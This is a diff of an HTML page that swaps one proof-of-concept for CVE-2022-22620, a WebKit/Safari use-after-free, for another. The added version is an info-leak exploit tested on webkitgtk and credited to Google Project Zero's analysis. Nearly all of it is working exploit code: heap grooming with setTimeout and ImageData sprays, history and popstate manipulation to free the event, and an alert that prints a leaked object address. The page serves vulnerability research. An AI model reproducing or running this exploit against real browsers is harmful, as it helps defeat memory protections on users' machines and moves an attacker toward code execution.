@@ -1,57 +1,82 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <meta charset="utf-8">
-  <title>💥 PS5 PoC - CVE-2022-22620</title>
-  <style>
-    body { background: black; color: lime; font-family: monospace; padding: 1em; white-space: pre-wrap; }
-  </style>
-</head>
-<body>
-  <h1>💥 CVE-2022-22620 PoC (Use-After-Free)</h1>
-  <pre id="log">[LOG]\n</pre>
-
+ 
 <script>
-  const log = document.getElementById("log");
-  function print(msg) {
-    log.textContent += msg + "\n";
-    console.log(msg);
-  }
+x = [1.1];
 
-  function triggerUAF() {
-    print("[*] Iniciando trigger CVE-2022-22620...");
+			
+var buffer      = new ArrayBuffer(8);
+var byteView    = new Uint8Array(buffer);
+var uint32View  = new Uint32Array(buffer);
+var float64View = new Float64Array(buffer);
 
-    let iframe = document.createElement('iframe');
-    document.body.appendChild(iframe);
 
-    iframe.contentDocument.open();
-    iframe.contentDocument.write("<body><div id='target'>Hello</div></body>");
-    iframe.contentDocument.close();
+function myfunc3(leaked,b,c,d,e,f,g,h,i,j,k,l)
+{
+if( leaked!=x) {
 
-    // Creamos un range sobre el iframe
-    let range = iframe.contentDocument.createRange();
-    let target = iframe.contentDocument.getElementById('target');
+float64View[0] = leaked;
 
-    range.selectNodeContents(target);
+alert("Leaked object: 0x"+ (uint32View[1]|0x20000).toString(16)  + (uint32View[0]>>8).toString(16) );
 
-    // Removemos el iframe → libera target y range internamente
-    document.body.removeChild(iframe);
-    print("[+] Iframe eliminado, objeto debería estar liberado");
+}
+//console.log(arguments);
+}                
+        
+function myfunc(a,b,c,d,e,f,g,h,i,j,k,l)
+{
+}        
+        
 
-    // Forzamos reuso del objeto potencialmente liberado
-    try {
-      let text = range.toString();  // UAF ocurre aquí en versiones vulnerables
-      print("[+] range.toString() ejecutado: " + text);
-    } catch (e) {
-      print("[-] Error al acceder a range: " + e);
-    }
 
-    print("[*] Fin del trigger.");
-  }
+function test_poc_safari()
+    {
 
-  window.onload = () => {
-    setTimeout(triggerUAF, 100);
-  };
-</script>
-</body>
-</html>
+	window.addEventListener('popstate', (event) => { 
+						
+	event = null;
+	for(i=0; i<15750; i++) setTimeout(myfunc3,15000,x,0x61,2,3,4,5,6,7,8,9,10,11);
+	setInterval( ()=> { 	for(i=0; i<200750; i++) new ImageData(1,96/4); 	} , 1500);				// trigger PopStateEvent::~PopStateEvent and dec the refcount 	
+	});
+            
+            
+                input = document.body.appendChild(document.createElement("input"));
+
+				foo = document.body.appendChild(document.createElement("a"));
+				foo.id = "foo";
+
+				for(i=0; i<1000; i++)	setTimeout(myfunc,0,0x61,0x61,0,4,5,6,7,8,9,10,11,12);
+
+				history.pushState("", "", location + "#foo");
+				for(i=0; i<1000; i++)	setTimeout(myfunc,0,0x61,0x61,0,4,5,6,7,8,9,10,11,12);
+				//Current state = state2
+
+				history.pushState("", "");
+				
+				setTimeout(() => {
+						
+						// Set the focus on the input element.
+						// During the call to back() the focus will change to the foo element 
+						// and therefore triggering the blur event on the input element
+						input.focus(); 
+						
+						input.onblur = () => {history.replaceState("", "");  
+						
+						 }
+						setTimeout(() => { history.back();   }, 500);		}, 500);
+
+
+        }
+     </script>
+    <head>
+     </head>
+     <body>
+        <h1>CVE-2022-22620: Use-after-free in Safari</h1>
+        <h1>info leak exploit: Tested on webkitgtk-2.34.3 (UBUNTU64) </h1>
+        
+        <h1>Based on Google Project Zero <a href=https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2022/CVE-2022-22620.html> POC</a></h1>
+        <center><button onclick="test_poc_safari();"> Test CVE-2022-22620 </button></center>
+     </body>
+
+    
+   </html>
